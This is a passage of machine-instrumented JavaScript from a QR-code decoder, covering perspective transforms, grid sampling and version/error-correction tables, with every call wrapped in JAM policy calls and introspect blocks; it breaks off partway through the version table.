function v131(x0$$2, y0$$2, x1$$3, y1$$3, x2$$1, y2$$1, x3, y3, x0p, y0p, x1p, y1p, x2p, y2p, x3p, y3p) {
  var qToS = JAM.call(this.quadrilateralToSquare, this, [x0$$2, y0$$2, x1$$3, y1$$3, x2$$1, y2$$1, x3, y3], JAM.policy.p38);
  var sToQ = JAM.call(this.squareToQuadrilateral, this, [x0p, y0p, x1p, y1p, x2p, y2p, x3p, y3p], JAM.policy.p38);
  return JAM.call(sToQ.times, sToQ, [qToS], JAM.policy.p39);
}
function v130(versionBits) {
  var bestDifference = 4294967295;
  var bestVersion = 0;
  var i$$4 = 0;
  var v316 = i$$4 < Version.VERSION_DECODE_INFO.length;
  for (;v316;) {
    var v312 = Version.VERSION_DECODE_INFO;
    introspect(JAM.policy.p26) {
      var targetVersion = v312[i$$4]
    }
    if (targetVersion === versionBits) {
      return JAM.call(this.getVersionForNumber, this, [i$$4 + 7], JAM.policy.p39);
    }
    var bitsDifference = JAM.call(FormatInformation.numBitsDiffering, FormatInformation, [versionBits, targetVersion], JAM.policy.p38);
    if (bitsDifference < bestDifference) {
      bestVersion = i$$4 + 7;
      bestDifference = bitsDifference;
    }
    i$$4 = i$$4 + 1;
    v316 = i$$4 < Version.VERSION_DECODE_INFO.length;
  }
  if (bestDifference <= 3) {
    return JAM.call(this.getVersionForNumber, this, [bestVersion], JAM.policy.p39);
  }
  return null;
}
function v129(dimension$$3) {
  if (dimension$$3 % 4 !== 1) {
    throw "Error getProvisionalVersionForDimension";
  }
  try {
    return JAM.call(Version.getVersionForNumber, Version, [dimension$$3 - 17 >> 2], JAM.policy.p39);
  } catch (iae) {
    throw "Error getVersionForNumber";
  }
  return;
}
function v128(versionNumber$$1) {
  var v1187 = versionNumber$$1 < 1;
  if (!v1187) {
    v1187 = versionNumber$$1 > 40;
  }
  if (v1187) {
    throw "ArgumentException";
  }
  var v321 = Version.VERSIONS;
  var v322 = versionNumber$$1 - 1;
  introspect(JAM.policy.p26) {
    return v321[v322];
  }
}
function v127(image$$4, dimension$$1, p1ToX, p1ToY, p2ToX, p2ToY, p3ToX, p3ToY, p4ToX, p4ToY, p1FromX, p1FromY, p2FromX, p2FromY, p3FromX, p3FromY, p4FromX, p4FromY) {
  var transform$$1 = JAM.call(PerspectiveTransform.quadrilateralToQuadrilateral, PerspectiveTransform, [p1ToX, p1ToY, p2ToX, p2ToY, p3ToX, p3ToY, p4ToX, p4ToY, p1FromX, p1FromY, p2FromX, p2FromY, p3FromX, p3FromY, p4FromX, p4FromY], JAM.policy.p38);
  return JAM.call(GridSampler.sampleGrid3, GridSampler, [image$$4, dimension$$1, transform$$1], JAM.policy.p38);
}
function v126(image$$3, dimension, transform) {
  var bits = JAM.new(BitMatrix, [dimension], JAM.policy.p39);
  var points$$1 = JAM.new(Array, [dimension << 1], JAM.policy.p39);
  var y$$31 = 0;
  var v340 = y$$31 < dimension;
  for (;v340;) {
    var max = points$$1.length;
    var iValue = y$$31 + .5;
    var x$$48 = 0;
    var v326 = x$$48 < max;
    for (;v326;) {
      var v324 = x$$48 >> 1;
      introspect(JAM.policy.p27) {
        points$$1[x$$48] = v324 + .5;
      }
      var v325 = x$$48 + 1;
      introspect(JAM.policy.p27) {
        points$$1[v325] = iValue;
      }
      x$$48 = x$$48 + 2;
      v326 = x$$48 < max;
    }
    JAM.call(transform.transformPoints1, transform, [points$$1], JAM.policy.p39);
    JAM.call(GridSampler.checkAndNudgePoints, GridSampler, [image$$3, points$$1], JAM.policy.p38);
    try {
      x$$48 = 0;
      var v339 = x$$48 < max;
      for (;v339;) {
        introspect(JAM.policy.p26) {
          var v1892 = points$$1[x$$48]
        }
        var v327 = JAM.call(Math.floor, Math, [v1892], JAM.policy.p39) * 4;
        var v2698 = x$$48 + 1;
        introspect(JAM.policy.p26) {
          var v2528 = points$$1[v2698]
        }
        var xpoint = v327 + JAM.call(Math.floor, Math, [v2528], JAM.policy.p39) * qrcode.width * 4;
        var v329 = image$$3;
        introspect(JAM.policy.p26) {
          var v1895 = points$$1[x$$48]
        }
        var v1190 = JAM.call(Math.floor, Math, [v1895], JAM.policy.p39);
        var v1896 = qrcode.width;
        var v2699 = x$$48 + 1;
        introspect(JAM.policy.p26) {
          var v2529 = points$$1[v2699]
        }
        var v330 = v1190 + v1896 * JAM.call(Math.floor, Math, [v2529], JAM.policy.p39);
        introspect(JAM.policy.p26) {
          var bit = v329[v330]
        }
        var v331 = qrcode.imagedata.data;
        var v1193;
        if (bit) {
          v1193 = 255;
        } else {
          v1193 = 0;
        }
        introspect(JAM.policy.p27) {
          v331[xpoint] = v1193;
        }
        var v332 = qrcode.imagedata.data;
        var v333 = xpoint + 1;
        var v1195;
        if (bit) {
          v1195 = 255;
        } else {
          v1195 = 0;
        }
        introspect(JAM.policy.p27) {
          v332[v333] = v1195;
        }
        var v334 = qrcode.imagedata.data;
        var v335 = xpoint + 2;
        introspect(JAM.policy.p27) {
          v334[v335] = 0;
        }
        var v336 = qrcode.imagedata.data;
        var v337 = xpoint + 3;
        introspect(JAM.policy.p27) {
          v336[v337] = 255;
        }
        if (bit) {
          JAM.call(bits.set_Renamed, bits, [x$$48 >> 1, y$$31], JAM.policy.p38);
        }
        x$$48 = x$$48 + 2;
        v339 = x$$48 < max;
      }
    } catch (aioobe) {
      throw "Error.checkAndNudgePoints";
    }
    y$$31 = y$$31 + 1;
    v340 = y$$31 < dimension;
  }
  return bits;
}
function v125(image$$2, points) {
  var width$$9 = qrcode.width;
  var height$$8 = qrcode.height;
  var nudged = true;
  var offset$$8 = 0;
  var v1198 = offset$$8 < points.length;
  if (v1198) {
    v1198 = nudged;
  }
  var v350 = v1198;
  for (;v350;) {
    introspect(JAM.policy.p26) {
      var v341 = points[offset$$8]
    }
    var x$$47 = JAM.call(Math.floor, Math, [v341], JAM.policy.p39);
    var v1199 = offset$$8 + 1;
    introspect(JAM.policy.p26) {
      var v342 = points[v1199]
    }
    var y$$30 = JAM.call(Math.floor, Math, [v342], JAM.policy.p39);
    var v2530 = x$$47 < -1;
    if (!v2530) {
      v2530 = x$$47 > width$$9;
    }
    var v1899 = v2530;
    if (!v1899) {
      v1899 = y$$30 < -1;
    }
    var v1200 = v1899;
    if (!v1200) {
      v1200 = y$$30 > height$$8;
    }
    if (v1200) {
      throw "Error.checkAndNudgePoints ";
    }
    nudged = false;
    if (x$$47 === -1) {
      introspect(JAM.policy.p27) {
        points[offset$$8] = 0;
      }
      nudged = true;
    } else {
      if (x$$47 === width$$9) {
        introspect(JAM.policy.p27) {
          points[offset$$8] = width$$9 - 1;
        }
        nudged = true;
      }
    }
    if (y$$30 === -1) {
      var v346 = offset$$8 + 1;
      introspect(JAM.policy.p27) {
        points[v346] = 0;
      }
      nudged = true;
    } else {
      if (y$$30 === height$$8) {
        var v347 = offset$$8 + 1;
        introspect(JAM.policy.p27) {
          points[v347] = height$$8 - 1;
        }
        nudged = true;
      }
    }
    offset$$8 = offset$$8 + 2;
    var v1201 = offset$$8 < points.length;
    if (v1201) {
      v1201 = nudged;
    }
    v350 = v1201;
  }
  nudged = true;
  offset$$8 = points.length - 2;
  var v1202 = offset$$8 >= 0;
  if (v1202) {
    v1202 = nudged;
  }
  var v361 = v1202;
  for (;v361;) {
    introspect(JAM.policy.p26) {
      var v352 = points[offset$$8]
    }
    x$$47 = JAM.call(Math.floor, Math, [v352], JAM.policy.p39);
    var v1203 = offset$$8 + 1;
    introspect(JAM.policy.p26) {
      var v353 = points[v1203]
    }
    y$$30 = JAM.call(Math.floor, Math, [v353], JAM.policy.p39);
    var v2532 = x$$47 < -1;
    if (!v2532) {
      v2532 = x$$47 > width$$9;
    }
    var v1902 = v2532;
    if (!v1902) {
      v1902 = y$$30 < -1;
    }
    var v1204 = v1902;
    if (!v1204) {
      v1204 = y$$30 > height$$8;
    }
    if (v1204) {
      throw "Error.checkAndNudgePoints ";
    }
    nudged = false;
    if (x$$47 === -1) {
      introspect(JAM.policy.p27) {
        points[offset$$8] = 0;
      }
      nudged = true;
    } else {
      if (x$$47 === width$$9) {
        introspect(JAM.policy.p27) {
          points[offset$$8] = width$$9 - 1;
        }
        nudged = true;
      }
    }
    if (y$$30 === -1) {
      var v357 = offset$$8 + 1;
      introspect(JAM.policy.p27) {
        points[v357] = 0;
      }
      nudged = true;
    } else {
      if (y$$30 === height$$8) {
        var v358 = offset$$8 + 1;
        introspect(JAM.policy.p27) {
          points[v358] = height$$8 - 1;
        }
        nudged = true;
      }
    }
    offset$$8 = offset$$8 - 2;
    var v1205 = offset$$8 >= 0;
    if (v1205) {
      v1205 = nudged;
    }
    v361 = v1205;
  }
  return;
}
function ECB(count$$3, dataCodewords) {
  function v1() {
    return this.dataCodewords;
  }
  function v0() {
    return this.count;
  }
  this.count = count$$3;
  this.dataCodewords = dataCodewords;
  JAM.call(this.__defineGetter__, this, ["Count", v0], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["DataCodewords", v1], JAM.policy.p23);
  return;
}
function ECBlocks(ecCodewordsPerBlock, ecBlocks1, ecBlocks2) {
  function v5() {
    return this.ecBlocks;
  }
  function v4() {
    var total = 0;
    var i$$1 = 0;
    var v362 = i$$1 < this.ecBlocks.length;
    for (;v362;) {
      var v2534 = this.ecBlocks;
      introspect(JAM.policy.p26) {
        var v1905 = v2534[i$$1]
      }
      total = total + v1905.length;
      i$$1 = i$$1 + 1;
      v362 = i$$1 < this.ecBlocks.length;
    }
    return total;
  }
  function v3() {
    return this.ecCodewordsPerBlock * this.NumBlocks;
  }
  function v2() {
    return this.ecCodewordsPerBlock;
  }
  this.ecCodewordsPerBlock = ecCodewordsPerBlock;
  if (ecBlocks2) {
    var v2850 = JAM.new(Array, [ecBlocks1, ecBlocks2], JAM.policy.p38);
    this.ecBlocks = v2850;
  } else {
    var v2851 = JAM.new(Array, [ecBlocks1], JAM.policy.p39);
    this.ecBlocks = v2851;
  }
  JAM.call(this.__defineGetter__, this, ["ECCodewordsPerBlock", v2], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["TotalECCodewords", v3], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["NumBlocks", v4], JAM.policy.p23);
  this.getECBlocks = v5;
  return;
}
function Version(versionNumber, alignmentPatternCenters, ecBlocks1$$1, ecBlocks2$$1, ecBlocks3, ecBlocks4) {
  function v11(ecLevel) {
    var v365 = this.ecBlocks;
    var v366 = ecLevel.ordinal_Renamed_Field;
    introspect(JAM.policy.p26) {
      return v365[v366];
    }
  }
  function v10() {
    var dimension$$2 = this.DimensionForVersion;
    var bitMatrix = JAM.new(BitMatrix, [dimension$$2], JAM.policy.p39);
    JAM.call(bitMatrix.setRegion, bitMatrix, [0, 0, 9, 9], JAM.policy.p22);
    JAM.call(bitMatrix.setRegion, bitMatrix, [dimension$$2 - 8, 0, 8, 9], JAM.policy.p41);
    JAM.call(bitMatrix.setRegion, bitMatrix, [0, dimension$$2 - 8, 9, 8], JAM.policy.p22);
    var max$$1 = this.alignmentPatternCenters.length;
    var x$$49 = 0;
    var v374 = x$$49 < max$$1;
    for (;v374;) {
      var v1209 = this.alignmentPatternCenters;
      introspect(JAM.policy.p26) {
        var v370 = v1209[x$$49]
      }
      var i$$3 = v370 - 2;
      var y$$32 = 0;
      var v373 = y$$32 < max$$1;
      for (;v373;) {
        var v1907 = x$$49 === 0;
        if (v1907) {
          var v2535 = y$$32 === 0;
          if (!v2535) {
            v2535 = y$$32 === max$$1 - 1;
          }
          v1907 = v2535;
        }
        var v1210 = v1907;
        if (!v1210) {
          var v1908 = x$$49 === max$$1 - 1;
          if (v1908) {
            v1908 = y$$32 === 0;
          }
          v1210 = v1908;
        }
        if (v1210) {
          y$$32 = y$$32 + 1;
          v373 = y$$32 < max$$1;
          continue;
        }
        var v1910 = this.alignmentPatternCenters;
        introspect(JAM.policy.p26) {
          var v1211 = v1910[y$$32]
        }
        JAM.call(bitMatrix.setRegion, bitMatrix, [v1211 - 2, i$$3, 5, 5], JAM.policy.p38);
        y$$32 = y$$32 + 1;
        v373 = y$$32 < max$$1;
      }
      x$$49 = x$$49 + 1;
      v374 = x$$49 < max$$1;
    }
    JAM.call(bitMatrix.setRegion, bitMatrix, [6, 9, 1, dimension$$2 - 17], JAM.policy.p22);
    JAM.call(bitMatrix.setRegion, bitMatrix, [9, 6, dimension$$2 - 17, 1], JAM.policy.p22);
    if (this.versionNumber > 6) {
      JAM.call(bitMatrix.setRegion, bitMatrix, [dimension$$2 - 11, 0, 3, 6], JAM.policy.p41);
      JAM.call(bitMatrix.setRegion, bitMatrix, [0, dimension$$2 - 11, 6, 3], JAM.policy.p22);
    }
    return bitMatrix;
  }
  function v9() {
    return 17 + 4 * this.versionNumber;
  }
  function v8() {
    return this.totalCodewords;
  }
  function v7() {
    return this.alignmentPatternCenters;
  }
  function v6() {
    return this.versionNumber;
  }
  this.versionNumber = versionNumber;
  this.alignmentPatternCenters = alignmentPatternCenters;
  var v2852 = JAM.new(Array, [ecBlocks1$$1, ecBlocks2$$1, ecBlocks3, ecBlocks4], JAM.policy.p38);
  this.ecBlocks = v2852;
  var total$$1 = 0;
  var ecCodewords = ecBlocks1$$1.ECCodewordsPerBlock;
  var ecbArray = ecBlocks1$$1.ecBlocks;
  var i$$2 = 0;
  var v381 = i$$2 < ecbArray.length;
  for (;v381;) {
    introspect(JAM.policy.p26) {
      var ecBlock = ecbArray[i$$2]
    }
    total$$1 = total$$1 + ecBlock.Count * (ecBlock.DataCodewords + ecCodewords);
    i$$2 = i$$2 + 1;
    v381 = i$$2 < ecbArray.length;
  }
  this.totalCodewords = total$$1;
  JAM.call(this.__defineGetter__, this, ["VersionNumber", v6], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["AlignmentPatternCenters", v7], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["TotalCodewords", v8], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["DimensionForVersion", v9], JAM.policy.p23);
  this.buildFunctionPattern = v10;
  this.getECBlocksForLevel = v11;
  return;
}
function buildVersions() {
  return JAM.new(Array, [JAM.new(Version, [1, JAM.new(Array, [], JAM.policy.p40), JAM.new(ECBlocks, [7, JAM.new(ECB, [1, 19], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [10, JAM.new(ECB, [1, 16], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [13, JAM.new(ECB, [1, 13], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [17, JAM.new(ECB, [1, 9], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [2, JAM.new(Array, [6, 18], JAM.policy.p22), JAM.new(ECBlocks, [10, 
  JAM.new(ECB, [1, 34], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [16, JAM.new(ECB, [1, 28], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [22, JAM.new(ECB, [1, 22], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [1, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [3, JAM.new(Array, [6, 22], JAM.policy.p22), JAM.new(ECBlocks, [15, JAM.new(ECB, [1, 55], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [1, 44], 
  JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [18, JAM.new(ECB, [2, 17], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [22, JAM.new(ECB, [2, 13], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [4, JAM.new(Array, [6, 26], JAM.policy.p22), JAM.new(ECBlocks, [20, JAM.new(ECB, [1, 80], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [18, JAM.new(ECB, [2, 32], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [2, 24], JAM.policy.p22)], JAM.policy.p22), 
  JAM.new(ECBlocks, [16, JAM.new(ECB, [4, 9], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [5, JAM.new(Array, [6, 30], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [1, 108], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [2, 43], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [18, JAM.new(ECB, [2, 15], JAM.policy.p22), JAM.new(ECB, [2, 16], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [22, JAM.new(ECB, [2, 11], JAM.policy.p22), 
  JAM.new(ECB, [2, 12], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [6, JAM.new(Array, [6, 34], JAM.policy.p22), JAM.new(ECBlocks, [18, JAM.new(ECB, [2, 68], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [16, JAM.new(ECB, [4, 27], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [4, 19], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [4, 15], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [7, JAM.new(Array, 
  [6, 22, 38], JAM.policy.p22), JAM.new(ECBlocks, [20, JAM.new(ECB, [2, 78], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [18, JAM.new(ECB, [4, 31], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [18, JAM.new(ECB, [2, 14], JAM.policy.p22), JAM.new(ECB, [4, 15], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [4, 13], JAM.policy.p22), JAM.new(ECB, [1, 14], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [8, JAM.new(Array, [6, 24, 42], JAM.policy.p22), 
  JAM.new(ECBlocks, [24, JAM.new(ECB, [2, 97], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [22, JAM.new(ECB, [2, 38], JAM.policy.p22), JAM.new(ECB, [2, 39], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [22, JAM.new(ECB, [4, 18], JAM.policy.p22), JAM.new(ECB, [2, 19], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [4, 14], JAM.policy.p22), JAM.new(ECB, [2, 15], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [9, JAM.new(Array, [6, 26, 
  46], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [2, 116], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [22, JAM.new(ECB, [3, 36], JAM.policy.p22), JAM.new(ECB, [2, 37], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [20, JAM.new(ECB, [4, 16], JAM.policy.p22), JAM.new(ECB, [4, 17], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [4, 12], JAM.policy.p22), JAM.new(ECB, [4, 13], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [10, 
  JAM.new(Array, [6, 28, 50], JAM.policy.p22), JAM.new(ECBlocks, [18, JAM.new(ECB, [2, 68], JAM.policy.p22), JAM.new(ECB, [2, 69], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [4, 43], JAM.policy.p22), JAM.new(ECB, [1, 44], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [6, 19], JAM.policy.p22), JAM.new(ECB, [2, 20], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [6, 15], JAM.policy.p22), JAM.new(ECB, [2, 16], JAM.policy.p22)], 
  JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [11, JAM.new(Array, [6, 30, 54], JAM.policy.p22), JAM.new(ECBlocks, [20, JAM.new(ECB, [4, 81], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [1, 50], JAM.policy.p22), JAM.new(ECB, [4, 51], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [4, 22], JAM.policy.p22), JAM.new(ECB, [4, 23], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [3, 12], JAM.policy.p22), JAM.new(ECB, [8, 
  13], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [12, JAM.new(Array, [6, 32, 58], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [2, 92], JAM.policy.p22), JAM.new(ECB, [2, 93], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [22, JAM.new(ECB, [6, 36], JAM.policy.p22), JAM.new(ECB, [2, 37], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [4, 20], JAM.policy.p22), JAM.new(ECB, [6, 21], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, 
  [28, JAM.new(ECB, [7, 14], JAM.policy.p22), JAM.new(ECB, [4, 15], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [13, JAM.new(Array, [6, 34, 62], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [4, 107], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [22, JAM.new(ECB, [8, 37], JAM.policy.p22), JAM.new(ECB, [1, 38], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [8, 20], JAM.policy.p22), JAM.new(ECB, [4, 21], JAM.policy.p22)], JAM.policy.p22), 
  JAM.new(ECBlocks, [22, JAM.new(ECB, [12, 11], JAM.policy.p22), JAM.new(ECB, [4, 12], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [14, JAM.new(Array, [6, 26, 46, 66], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [3, 115], JAM.policy.p22), JAM.new(ECB, [1, 116], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [4, 40], JAM.policy.p22), JAM.new(ECB, [5, 41], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [20, JAM.new(ECB, [11, 16], JAM.policy.p22), 
  JAM.new(ECB, [5, 17], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [11, 12], JAM.policy.p22), JAM.new(ECB, [5, 13], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [15, JAM.new(Array, [6, 26, 48, 70], JAM.policy.p22), JAM.new(ECBlocks, [22, JAM.new(ECB, [5, 87], JAM.policy.p22), JAM.new(ECB, [1, 88], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [5, 41], JAM.policy.p22), JAM.new(ECB, [5, 42], JAM.policy.p22)], JAM.policy.p22), 
  JAM.new(ECBlocks, [30, JAM.new(ECB, [5, 24], JAM.policy.p22), JAM.new(ECB, [7, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [11, 12], JAM.policy.p22), JAM.new(ECB, [7, 13], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [16, JAM.new(Array, [6, 26, 50, 74], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [5, 98], JAM.policy.p22), JAM.new(ECB, [1, 99], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [7, 45], JAM.policy.p22), 
  JAM.new(ECB, [3, 46], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [24, JAM.new(ECB, [15, 19], JAM.policy.p22), JAM.new(ECB, [2, 20], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [3, 15], JAM.policy.p22), JAM.new(ECB, [13, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [17, JAM.new(Array, [6, 30, 54, 78], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [1, 107], JAM.policy.p22), JAM.new(ECB, [5, 108], JAM.policy.p22)], JAM.policy.p22), 
  JAM.new(ECBlocks, [28, JAM.new(ECB, [10, 46], JAM.policy.p22), JAM.new(ECB, [1, 47], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [1, 22], JAM.policy.p22), JAM.new(ECB, [15, 23], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [2, 14], JAM.policy.p22), JAM.new(ECB, [17, 15], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [18, JAM.new(Array, [6, 30, 56, 82], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [5, 120], JAM.policy.p22), 
  JAM.new(ECB, [1, 121], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [9, 43], JAM.policy.p22), JAM.new(ECB, [4, 44], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [17, 22], JAM.policy.p22), JAM.new(ECB, [1, 23], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [2, 14], JAM.policy.p22), JAM.new(ECB, [19, 15], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [19, JAM.new(Array, [6, 30, 58, 86], JAM.policy.p22), 
  JAM.new(ECBlocks, [28, JAM.new(ECB, [3, 113], JAM.policy.p22), JAM.new(ECB, [4, 114], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [3, 44], JAM.policy.p22), JAM.new(ECB, [11, 45], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [17, 21], JAM.policy.p22), JAM.new(ECB, [4, 22], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [9, 13], JAM.policy.p22), JAM.new(ECB, [16, 14], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), 
  JAM.new(Version, [20, JAM.new(Array, [6, 34, 62, 90], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [3, 107], JAM.policy.p22), JAM.new(ECB, [5, 108], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [3, 41], JAM.policy.p22), JAM.new(ECB, [13, 42], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [15, 24], JAM.policy.p22), JAM.new(ECB, [5, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [15, 15], JAM.policy.p22), JAM.new(ECB, 
  [10, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [21, JAM.new(Array, [6, 28, 50, 72, 94], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [4, 116], JAM.policy.p22), JAM.new(ECB, [4, 117], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [17, 42], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [17, 22], JAM.policy.p22), JAM.new(ECB, [6, 23], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [19, 
  16], JAM.policy.p22), JAM.new(ECB, [6, 17], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [22, JAM.new(Array, [6, 26, 50, 74, 98], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [2, 111], JAM.policy.p22), JAM.new(ECB, [7, 112], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [17, 46], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [7, 24], JAM.policy.p22), JAM.new(ECB, [16, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, 
  [24, JAM.new(ECB, [34, 13], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [23, JAM.new(Array, [6, 30, 54, 74, 102], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [4, 121], JAM.policy.p22), JAM.new(ECB, [5, 122], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [4, 47], JAM.policy.p22), JAM.new(ECB, [14, 48], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [11, 24], JAM.policy.p22), JAM.new(ECB, [14, 25], JAM.policy.p22)], 
